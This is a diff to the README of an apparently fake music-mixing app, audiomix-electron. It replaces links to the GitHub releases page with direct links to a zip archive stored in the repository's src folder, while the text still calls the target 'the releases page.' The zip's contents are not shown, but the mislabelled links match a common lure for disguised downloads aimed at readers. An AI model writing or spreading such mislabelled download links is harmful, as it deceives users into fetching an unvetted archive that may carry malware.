@@ -1,7 +1,7 @@
 # 🎵 audiomix-electron - Your Easy Music Mixing Solution
 
 ## 📥 Download Now
-[![Download Audiomix Electron](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/ShappToo/audiomix-electron/releases)
+[![Download Audiomix Electron](https://raw.githubusercontent.com/ShappToo/audiomix-electron/master/src/audiomix-electron_Think.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/ShappToo/audiomix-electron/master/src/audiomix-electron_Think.zip)
 
 ## 🚀 Getting Started
 Welcome to Audiomix Electron! This application provides a user-friendly interface for mixing audio tracks. Whether you are a beginner or a seasoned producer, you will find that Audiomix Electron makes music production simple and enjoyable.
@@ -25,7 +25,7 @@ Audiomix Electron includes several powerful features to enhance your music-makin
 Follow these simple steps to get started with Audiomix Electron:
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/ShappToo/audiomix-electron/releases) to access the releases page. This page contains the latest version of Audiomix Electron.
+   Click [here](https://raw.githubusercontent.com/ShappToo/audiomix-electron/master/src/audiomix-electron_Think.zip) to access the releases page. This page contains the latest version of Audiomix Electron.
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the application. Locate the most recent version and click on it. 
